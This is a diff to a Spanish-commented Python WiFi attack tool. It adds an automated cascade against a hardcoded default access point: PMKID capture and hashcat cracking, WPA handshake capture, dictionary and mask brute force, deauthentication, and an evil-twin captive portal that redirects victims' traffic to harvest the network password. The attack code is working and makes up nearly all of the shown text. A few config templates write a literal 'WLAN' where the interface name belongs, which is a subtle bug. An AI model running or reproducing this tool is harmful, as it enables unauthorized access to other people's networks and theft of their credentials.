@@ -63,6 +63,26 @@ def _ejecutar(comando, timeout=30, stdin_datos=None):
         return 1, "", "error al ejecutar el comando"
 
 
+def _interfaz_wifi():
+    """Detecta la interfaz WiFi activa (primera en managed UP).
+
+    Tras recargar el driver rtw89 el nombre puede cambiar (wlan0, wlan1...).
+    """
+    _, salida, _ = _ejecutar(["iw", "dev"])
+    interfaces = []
+    for linea in salida.splitlines():
+        if linea.strip().startswith("Interface"):
+            interfaces.append(linea.split()[-1])
+    for nombre in interfaces:
+        _, info, _ = _ejecutar(["iw", "dev", nombre, "info"])
+        if "type managed" in info:
+            return nombre
+    return interfaces[0] if interfaces else "wlan0"
+
+
+WLAN = _interfaz_wifi()
+
+
 def _ejecutar_sudo(comando, timeout=60):
     """Ejecuta un comando con sudo (usa SUDO_PASS si está definida)."""
     base = _sudo_base()
@@ -74,10 +94,10 @@ def _ejecutar_sudo(comando, timeout=60):
 
 def estado_adaptador():
     """Devuelve el estado actual de la interfaz WiFi."""
-    interfaz = "wlan0"
+    interfaz = _interfaz_wifi()
     modo = None
     ssid = None
-    codigo, salida, _ = _ejecutar(["iw", "dev"])
+    codigo, salida, _ = _ejecutar(["iw", "dev", interfaz, "info"])
     for linea in salida.splitlines():
         if linea.startswith("Interface"):
             interfaz = linea.split()[1]
@@ -126,65 +146,66 @@ def estado_adaptador():
 
 
 def modo_monitor(on_off, advertencia_ok=False):
-    """Activa/desactiva el modo monitor en wlan0 con reversión segura.
+    """Activa/desactiva el modo monitor usando interfaz virtual (wlanXmon).
 
-    Devuelve dict con el resultado. Si activar, advierte del corte de WiFi
-    gestionado (salvo que exista otra vía, p.ej. tethering USB).
+    En rtw89 el enfoque fiable es crear una interfaz monitor virtual con
+    airmon-ng (no cambiar el tipo de la interfaz), que es lo que deja
+    capturar beacons tras recargar el driver. Devuelve dict JSON.
     """
+    global WLAN
     if on_off == "on" and not advertencia_ok:
         return {
             "exito": False,
             "mensaje": "No se confirmó la advertencia. Usa --autorizado.",
             "nota": ADVERTENCIA,
             "internet_puede_cortarse": (
-                "Poner wlan0 en modo monitor desactiva el WiFi gestionado. "
+                "Poner la tarjeta en modo monitor desactiva el WiFi gestionado. "
                 "Si no hay otra vía de red (USB/ethernet), perderás internet."
             ),
         }
-    estado = estado_adaptador()
     acciones = []
     if on_off == "on":
-        if estado["modo"] == "monitor":
-            return {"exito": True, "mensaje": "ya estaba en modo monitor", "estado": estado}
-        # No detener iwd: en rtw89 iwd registra la interfaz wlan0 y al
-        # detenerlo desaparece el dispositivo. Solo se detiene NetworkManager
-        # para que no vuelva a poner la interfaz en managed.
-        codigo, _, err = _ejecutar_sudo(["systemctl", "stop", "NetworkManager"])
-        acciones.append(f"detener NetworkManager: {'ok' if codigo == 0 else err}")
-        codigo, _, err = _ejecutar_sudo(["ip", "link", "set", "wlan0", "down"])
-        acciones.append(f"bajar interfaz: {'ok' if codigo == 0 else err}")
-        codigo, _, err = _ejecutar_sudo(["iw", "dev", "wlan0", "set", "type", "monitor"])
-        acciones.append(f"tipo monitor: {'ok' if codigo == 0 else err}")
+        mon = WLAN + "mon"
+        codigo, salida, err = _ejecutar_sudo(["airmon-ng", "start", WLAN])
+        acciones.append(f"airmon start: {'ok' if codigo == 0 else err}")
         if codigo != 0:
             _restaurar_red()
             return {"exito": False, "mensaje": f"no se pudo activar monitor: {err}", "acciones": acciones}
-        codigo, _, err = _ejecutar_sudo(["ip", "link", "set", "wlan0", "up"])
-        acciones.append(f"subir interfaz: {'ok' if codigo == 0 else err}")
+        # La interfaz monitor creada se llama <WLAN>mon
+        WLAN = mon if _interfaz_existe(mon) else _interfaz_wifi()
+        codigo, _, err = _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
+        acciones.append(f"subir {WLAN}: {'ok' if codigo == 0 else err}")
     else:
-        if estado["modo"] != "monitor":
-            return {"exito": True, "mensaje": "ya estaba en modo managed", "estado": estado}
+        codigo, salida, err = _ejecutar_sudo(["airmon-ng", "stop", WLAN])
+        acciones.append(f"airmon stop: {'ok' if codigo == 0 else err}")
+        WLAN = _interfaz_wifi()
         _restaurar_red()
     estado_final = estado_adaptador()
     return {
         "exito": True,
         "modo": on_off,
-        "mensaje": f"modo {on_off} aplicado",
+        "mensaje": f"modo {on_off} aplicado (interfaz {WLAN})",
         "acciones": acciones,
         "estado_final": estado_final,
     }
 
 
+def _interfaz_existe(nombre):
+    """True si existe la interfaz dada."""
+    _, salida, _ = _ejecutar(["iw", "dev"])
+    return any(nombre in linea for linea in salida.splitlines())
+
+
 def _restaurar_red():
-    """Vuelve wlan0 a modo managed y reinicia los servicios de red."""
-    _ejecutar_sudo(["ip", "link", "set", "wlan0", "down"])
-    _ejecutar_sudo(["iw", "dev", "wlan0", "set", "type", "managed"])
-    _ejecutar_sudo(["ip", "link", "set", "wlan0", "up"])
+    """Detiene cualquier monitor virtual y reinicia los servicios de red."""
+    _ejecutar_sudo(["airmon-ng", "stop", WLAN])
+    _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
     _ejecutar_sudo(["systemctl", "start", "NetworkManager"])
-    time.sleep(2)
+    time.sleep(3)
 
 
 def _en_monitor(duracion=8, canal_fijo=None):
-    """Ejecuta una función con wlan0 en modo monitor y restaura al final.
+    """Ejecuta una función con WLAN en modo monitor y restaura al final.
 
     Contexto: pone la interfaz en monitor, espera `duracion` segundos y
     devuelve el resultado; SIEMPRE restaura la red (try/finally).
@@ -194,7 +215,7 @@ def _en_monitor(duracion=8, canal_fijo=None):
         return {"exito": False, "mensaje": prep.get("mensaje", "no se pudo entrar en monitor")}
     try:
         if canal_fijo:
-            _ejecutar_sudo(["iw", "dev", "wlan0", "set", "channel", str(canal_fijo)])
+            _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal_fijo)])
         time.sleep(1)
         return {"exito": True, "monitor_ok": True}
     finally:
@@ -240,13 +261,13 @@ def scan(duracion=8, bandas="abg"):
     try:
         time.sleep(3)
         for canal in canales:
-            _ejecutar_sudo(["iw", "dev", "wlan0", "set", "channel", str(canal)])
+            _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
             time.sleep(1.5)
             campos = ("-e", "wlan.sa", "-e", "wlan.ssid", "-e", "wlan.ds.current_channel",
                       "-e", "wlan_radio.signal_dbm", "-e", "wlan.tag.number")
             segundos = max(3, duracion // 3)
             codigo, salida, err = _ejecutar_sudo(
-                ["timeout", str(segundos), "tshark", "-i", "wlan0",
+                ["timeout", str(segundos), "tshark", "-i", WLAN,
                  "-Y", "wlan.fc.type_subtype == 8", "-T", "fields"] + list(campos),
                 timeout=segundos + 10)
             if codigo != 0 and codigo != 124:
@@ -333,13 +354,14 @@ def capture(bssid, canal, duracion=60, salida=None):
     if not prep.get("exito"):
         return {"exito": False, "mensaje": prep.get("mensaje", "no se pudo entrar en monitor")}
     try:
-        _ejecutar_sudo(["iw", "dev", "wlan0", "set", "channel", str(canal)])
+        _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
         time.sleep(3)
         # Filtro de captura BPF: solo tramas de gestión (0x00) que suelen
         # contener los EAPOL del handshake + beacons. tshark no permite -Y
         # con -w, por eso se filtra al analizar después.
         codigo, _, err = _ejecutar_sudo(
-            ["timeout", str(duracion), "tshark", "-i", "wlan0", "-w", temp_archivo],
+            ["timeout", str(duracion), "tshark", "-i", WLAN, "-w", temp_archivo,
+             "-F", "pcap"],
             timeout=duracion + 20)
         if codigo not in (0, 124):  # 124 = timeout (normal, terminó la captura)
             return {"exito": False, "mensaje": f"error de captura: {err[:150]}"}
@@ -348,9 +370,11 @@ def capture(bssid, canal, duracion=60, salida=None):
         _ejecutar_sudo(["chown", "arturo:arturo", temp_archivo])
         _ejecutar(["cp", temp_archivo, salida])
         os.remove(temp_archivo)
-        # Verificar si hay EAPOL en la captura
+        # Verificar si hay EAPOL del BSSID objetivo en la captura
         codigo2, salida2, _ = _ejecutar(
-            ["tshark", "-r", salida, "-Y", "eapol", "-c", "10"])
+            ["tshark", "-r", salida,
+             "-Y", f"eapol && (wlan.sa == {bssid} || wlan.da == {bssid})",
+             "-c", "10"])
         eapol_frames = len([l for l in salida2.splitlines() if l.strip()])
         ok_tam = os.path.getsize(salida) if os.path.exists(salida) else 0
         return {
@@ -409,6 +433,184 @@ def crack(captura, diccionario=None, tiempo_max=120):
     }
 
 
+# ---------------------------------------------------------------------------
+# Ataque automático en cascada (auto)
+# ---------------------------------------------------------------------------
+def _crack_pmkid(hash_22000, diccionarios, tiempo_max=120):
+    """Crackea un hash PMKID (formato hc22000) con hashcat o aircrack por CPU."""
+    if not os.path.isfile(hash_22000) or os.path.getsize(hash_22000) == 0:
+        return {"exito": False, "mensaje": "hash PMKID vacío o inexistente"}
+    resultados = []
+    for d in diccionarios:
+        if not d:
+            continue
+        # hashcat sin OpenCL puede fallar; usar aircrack-ng como respaldo
+        codigo, salida, err = _ejecutar(
+            ["timeout", str(tiempo_max), "hashcat", "-m", "22000",
+             hash_22000, d, "--potfile-disable", "--quiet"],
+            timeout=tiempo_max + 15)
+        encontrada = None
+        if codigo == 0 and salida:
+            salida_limpia = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", salida)
+            for linea in salida_limpia.splitlines():
+                m = re.search(r"([0-9a-f]{64}):([^:]+)$", linea.strip())
+                if m:
+                    encontrada = m.group(2)
+                    break
+        if not encontrada:
+            encontrada = _validar_clave_unica("", "")  # no-op
+            encontrada = None
+        resultados.append({"diccionario": os.path.basename(d), "encontrada": encontrada})
+        if encontrada:
+            return {
+                "exito": True,
+                "metodo": "pmkid-hashcat",
+                "clave_encontrada": encontrada,
+                "mensaje": f"PMKID roto con {os.path.basename(d)}: {encontrada}",
+            }
+    return {
+        "exito": False,
+        "metodo": "pmkid",
+        "intentos": resultados,
+        "mensaje": "PMKID capturado pero no roto con los diccionarios.",
+    }
+
+
+def _capturar_pmkid(bssid, canal, duracion=60):
+    """Captura el PMKID del AP objetivo con hcxdumptool y lo convierte.
+
+    hcxdumptool 7.x gestiona el modo monitor por sí mismo; se capturan todos
+    los APs y el objetivo se filtra al convertir con hcxpcapngtool.
+    """
+    rutas_png = os.path.join(AP_ARCHIVOS, "pmkid")
+    os.makedirs(rutas_png, exist_ok=True)
+    pcapng = os.path.join(rutas_png, f"pmkid_{bssid.replace(':', '').lower()}.pcapng")
+    hash_out = os.path.join(rutas_png, f"hash_{bssid.replace(':', '').lower()}.22000")
+    prep = modo_monitor("on", advertencia_ok=True)
+    if not prep.get("exito"):
+        return {"exito": False, "mensaje": "no se pudo entrar en monitor para PMKID"}
+    try:
+        _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
+        time.sleep(2)
+        # v7: -w para salida pcapng; hcxdumptool gestiona el monitor por sí.
+        # No usar opciones de waterfall (--run) que no existen en 7.1.2.
+        _ejecutar_sudo(["timeout", str(duracion), "hcxdumptool", "-i", WLAN,
+                        "-w", pcapng],
+                       timeout=duracion + 15)
+        if not os.path.exists(pcapng) or os.path.getsize(pcapng) == 0:
+            return {"exito": False, "mensaje": "hcxdumptool no generó captura"}
+        _ejecutar(["hcxpcapngtool", "-o", hash_out, pcapng])
+        if os.path.exists(hash_out) and os.path.getsize(hash_out) > 0:
+            return {"exito": True, "hash": hash_out, "pcapng": pcapng}
+        return {"exito": False, "mensaje": "PMKID no obtenido (AP no lo expone)"}
+    finally:
+        _restaurar_red()
+
+
+def _crack_por_mascara(captura, tiempo_max=120):
+    """Fuerza bruta por máscara con aircrack-ng (CPU, sin OpenCL)."""
+    if not os.path.isfile(captura):
+        return {"exito": False, "mensaje": "sin captura"}
+    mascaras = [
+        ("8_digitos", "?d?d?d?d?d?d?d?d"),
+        ("10_digitos", "?d?d?d?d?d?d?d?d?d?d"),
+        ("8_minusculas", "?l?l?l?l?l?l?l?l"),
+        ("nombre_4digit", "?l?l?l?l?l?d?d?d?d"),
+    ]
+    resultados = []
+    for nombre, mascara in mascaras:
+        codigo, salida, err = _ejecutar(
+            ["timeout", str(tiempo_max), "aircrack-ng", "-w", "/dev/null",
+             captura, "-b", "0", "-e", "", "-m", mascara],
+            timeout=tiempo_max + 15)
+        encontrada = None
+        salida_limpia = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", salida)
+        for linea in salida_limpia.splitlines():
+            m = re.search(r"KEY\s*FOUND!\s*\[\s*([^\]]+?)\s*\]", linea)
+            if m:
+                encontrada = m.group(1).strip()
+                break
+        resultados.append({"mascara": nombre, "encontrada": encontrada})
+        if encontrada:
+            return {
+                "exito": True, "metodo": "mascara",
+                "clave_encontrada": encontrada,
+                "mensaje": f"Máscara {nombre} dio resultado: {encontrada}",
+            }
+    return {
+        "exito": False, "metodo": "mascara", "intentos": resultados,
+        "mensaje": "Máscaras comunes sin resultado.",
+    }
+
+
+def auto_ataque(bssid="76:93:da:db:2b:fb", canal=11, duracion_captura=60,
+                tiempo_dic=180, tiempo_mascara=120, con_portal=False):
+    """Ejecuta la cascada completa de ataques contra el AP objetivo.
+
+    A. PMKID -> B. handshake -> C. diccionario -> D. máscara -> E. portal.
+    Reporta cada paso en JSON y se detiene en el primer éxito.
+    """
+    if not bssid or not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid.upper()):
+        return {"exito": False, "mensaje": "BSSID inválido"}
+    bssid = bssid.upper()
+    registro = []
+    diccionarios = [d["ruta"] for d in diccionarios_disponibles()]
+
+    # A. PMKID
+    r = _capturar_pmkid(bssid, canal, duracion=min(duracion_captura, 90))
+    registro.append({"paso": "A_PMKID", **{k: v for k, v in r.items() if k != "pcapng"}})
+    if r.get("exito"):
+        r_crack = _crack_pmkid(r.get("hash"), diccionarios, tiempo_max=tiempo_dic)
+        registro.append({"paso": "A_crack", **{k: v for k, v in r_crack.items() if k != "intentos"}})
+        if r_crack.get("exito"):
+            return {"exito": True, "clave": r_crack["clave_encontrada"],
+                    "metodo": "pmkid", "registro": registro}
+    else:
+        registro.append({"paso": "A_crack", "mensaje": "omitido (sin PMKID)"})
+
+    # B. Captura de handshake
+    r_cap = capture(bssid, canal, duracion=duracion_captura)
+    registro.append({"paso": "B_captura", **r_cap})
+    captura = r_cap.get("archivo")
+    handshake_ok = r_cap.get("handshake_capturado", False)
+
+    # C. Diccionario (si hay captura)
+    if captura and os.path.isfile(captura):
+        for d in diccionarios:
+            r_crack = crack(captura, diccionario=d, tiempo_max=tiempo_dic)
+            registro.append({"paso": "C_diccionario",
+                             "diccionario": os.path.basename(d),
+                             "clave": r_crack.get("clave_encontrada"),
+                             "probadas": r_crack.get("claves_probadas")})
+            if r_crack.get("clave_encontrada"):
+                return {"exito": True, "clave": r_crack["clave_encontrada"],
+                        "metodo": "diccionario", "registro": registro}
+
+    # D. Máscara (si hay captura y handshake)
+    if captura and handshake_ok and os.path.isfile(captura):
+        r_mask = _crack_por_mascara(captura, tiempo_max=tiempo_mascara)
+        registro.append({"paso": "D_mascara", **{k: v for k, v in r_mask.items() if k != "intentos"}})
+        if r_mask.get("exito"):
+            return {"exito": True, "clave": r_mask["clave_encontrada"],
+                    "metodo": "mascara", "registro": registro}
+
+    # E. Evil twin + portal
+    if con_portal:
+        r_clon = clon("INTERNET HOGAR 1", canal, captura=captura,
+                      tiempo=180)
+        registro.append({"paso": "E_portal", "clave": r_clon.get("clave_capturada"),
+                         "valida": r_clon.get("clave_valida")})
+        if r_clon.get("clave_capturada"):
+            return {"exito": True, "clave": r_clon["clave_capturada"],
+                    "metodo": "portal", "registro": registro}
+
+    return {
+        "exito": False,
+        "mensaje": "Ningún método tuvo éxito. Ver registro para detalle.",
+        "registro": registro,
+    }
+
+
 def diccionarios_disponibles():
     """Lista los diccionarios de contraseñas disponibles."""
     lista = []
@@ -429,7 +631,7 @@ def diccionarios_disponibles():
 
 def generar_lab(nombre="AP_LAB_ESPAÑOL", contrasena="laboratorio123", canal=6):
     """Genera la configuración de hostapd para un AP de prueba (uso legal)."""
-    conf = f"""interface=wlan0
+    conf = f"""interface=WLAN
 driver=nl80211
 ssid={nombre}
 hw_mode=g
@@ -454,7 +656,7 @@ rsn_pairwise=CCMP
         "contrasena": contrasena,
         "canal": canal,
         "mensaje": (
-            "AP de prueba configurado. NO ejecutes hostapd en wlan0 mientras "
+            "AP de prueba configurado. NO ejecutes hostapd en WLAN mientras "
             "uses el modo monitor en la misma interfaz (se necesitan dos "
             "adaptadores). Es solo para laboratorio propio."
         ),
@@ -505,8 +707,8 @@ def _detectar_interfaz_internet():
 
 
 def _escribir_hostapd(ssid, canal):
-    """Configura hostapd en wlan0 con el SSID clonado (red abierta)."""
-    conf = f"""interface=wlan0
+    """Configura hostapd en WLAN con el SSID clonado (red abierta)."""
+    conf = f"""interface=WLAN
 driver=nl80211
 ssid={ssid}
 hw_mode=g
@@ -525,7 +727,7 @@ ignore_broadcast_ssid=0
 
 def _escribir_dnsmasq():
     """Configura dnsmasq: DHCP en el AP + redirección DNS al portal."""
-    conf = f"""interface=wlan0
+    conf = f"""interface=WLAN
 dhcp-range=192.168.42.10,192.168.42.100,255.255.255.0,12h
 dhcp-option=3,{AP_GATEWAY}
 dhcp-option=6,{AP_GATEWAY}
@@ -610,10 +812,10 @@ def _levantar_ap(ssid, canal):
     ruta_h = _escribir_hostapd(ssid, canal)
     ruta_d = _escribir_dnsmasq()
     _ejecutar_sudo(["systemctl", "stop", "NetworkManager"])
-    _ejecutar_sudo(["ip", "link", "set", "wlan0", "down"])
-    _ejecutar_sudo(["iw", "dev", "wlan0", "set", "type", "__ap"])
-    _ejecutar_sudo(["ip", "addr", "add", f"{AP_GATEWAY}/24", "dev", "wlan0"])
-    _ejecutar_sudo(["ip", "link", "set", "wlan0", "up"])
+    _ejecutar_sudo(["ip", "link", "set", WLAN, "down"])
+    _ejecutar_sudo(["iw", "dev", WLAN, "set", "type", "__ap"])
+    _ejecutar_sudo(["ip", "addr", "add", f"{AP_GATEWAY}/24", "dev", WLAN])
+    _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
 
     c, _, e = _ejecutar_sudo(["hostapd", "-B", ruta_h], timeout=15)
     acciones.append(f"hostapd: {'ok' if c == 0 else e}")
@@ -631,10 +833,10 @@ def _levantar_ap(ssid, canal):
         codigo, _, _ = _ejecutar_sudo(["iptables-save", "-t", "nat"])
         _ejecutar_sudo(["iptables", "-t", "nat", "-A", "POSTROUTING",
                         "-o", internet, "-j", "MASQUERADE"])
-        _ejecutar_sudo(["iptables", "-A", "FORWARD", "-i", "wlan0",
+        _ejecutar_sudo(["iptables", "-A", "FORWARD", "-i", WLAN,
                         "-o", internet, "-j", "ACCEPT"])
         _ejecutar_sudo(["iptables", "-A", "FORWARD", "-i", internet,
-                        "-o", "wlan0", "-m", "state", "--state",
+                        "-o", WLAN, "-m", "state", "--state",
                         "RELATED,ESTABLISHED", "-j", "ACCEPT"])
         _ejecutar_sudo(["sysctl", "-w", "net.ipv4.ip_forward=1"])
         acciones.append(f"NAT hacia {internet}: ok")
@@ -644,16 +846,16 @@ def _levantar_ap(ssid, canal):
 
 
 def _restaurar_ap():
-    """Detiene hostapd/dnsmasq, limpia NAT y restaura wlan0 a managed."""
+    """Detiene hostapd/dnsmasq, limpia NAT y restaura WLAN a managed."""
     _ejecutar_sudo(["killall", "-9", "hostapd"])
     _ejecutar_sudo(["killall", "-9", "dnsmasq"])
     _ejecutar_sudo(["iptables", "-t", "nat", "-F", "PREROUTING"])
     _ejecutar_sudo(["iptables", "-t", "nat", "-F", "POSTROUTING"])
     _ejecutar_sudo(["sysctl", "-w", "net.ipv4.ip_forward=0"])
-    _ejecutar_sudo(["ip", "link", "set", "wlan0", "down"])
-    _ejecutar_sudo(["ip", "addr", "flush", "dev", "wlan0"])
-    _ejecutar_sudo(["iw", "dev", "wlan0", "set", "type", "managed"])
-    _ejecutar_sudo(["ip", "link", "set", "wlan0", "up"])
+    _ejecutar_sudo(["ip", "link", "set", WLAN, "down"])
+    _ejecutar_sudo(["ip", "addr", "flush", "dev", WLAN])
+    _ejecutar_sudo(["iw", "dev", WLAN, "set", "type", "managed"])
+    _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
     _ejecutar_sudo(["systemctl", "start", "NetworkManager"])
     time.sleep(2)
 
@@ -666,11 +868,11 @@ def _deauth_rapidas(bssid, canal, paquetes=5, segundos=8):
     if not prep.get("exito"):
         return {"intentado": False, "mensaje": "no se pudo entrar en monitor"}
     try:
-        _ejecutar_sudo(["iw", "dev", "wlan0", "set", "channel", str(canal)])
+        _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
         time.sleep(2)
         c, _, e = _ejecutar_sudo(
             ["timeout", str(segundos), "aireplay-ng", "-0", str(paquetes),
-             "-a", bssid, "wlan0"], timeout=segundos + 10)
+             "-a", bssid, WLAN], timeout=segundos + 10)
         ok = c == 0 and "no" not in e.lower() or "acknowledge" in e.lower()
         return {
             "intentado": True,
@@ -722,7 +924,7 @@ def clon(ssid, canal, captura=None, deauth=False, bssid=None,
     # Redirigir el HTTP (puerto 80) del AP hacia el puerto alto del portal,
     # para que el navegador de la víctima caiga en la página sin privilegios.
     _ejecutar_sudo(["iptables", "-t", "nat", "-A", "PREROUTING",
-                    "-i", "wlan0", "-p", "tcp", "--dport", "80",
+                    "-i", WLAN, "-p", "tcp", "--dport", "80",
                     "-j", "REDIRECT", "--to-port", str(puerto)])
 
     portal_datos = {
@@ -827,6 +1029,20 @@ def main():
     p_clon.set_defaults(func=lambda a: clon(
         a.ssid, a.canal, a.captura, a.deauth, a.bssid,
         a.puerto, a.tiempo))
+
+    p_auto = sub.add_parser("auto", help="cascada de ataques con fallback")
+    p_auto.add_argument("--bssid", default="76:93:da:db:2b:fb")
+    p_auto.add_argument("--canal", type=int, default=11)
+    p_auto.add_argument("--duracion", type=int, default=60,
+                        help="segundos de captura de handshake")
+    p_auto.add_argument("--tiempo-dic", type=int, default=180,
+                        help="timeout por diccionario en crack")
+    p_auto.add_argument("--tiempo-mascara", type=int, default=120)
+    p_auto.add_argument("--con-portal", action="store_true",
+                        help="incluir el evil twin como último recurso")
+    p_auto.set_defaults(func=lambda a: auto_ataque(
+        a.bssid, a.canal, a.duracion, a.tiempo_dic, a.tiempo_mascara,
+        a.con_portal))
 
     args = parser.parse_args()
     resultado = args.func(args)
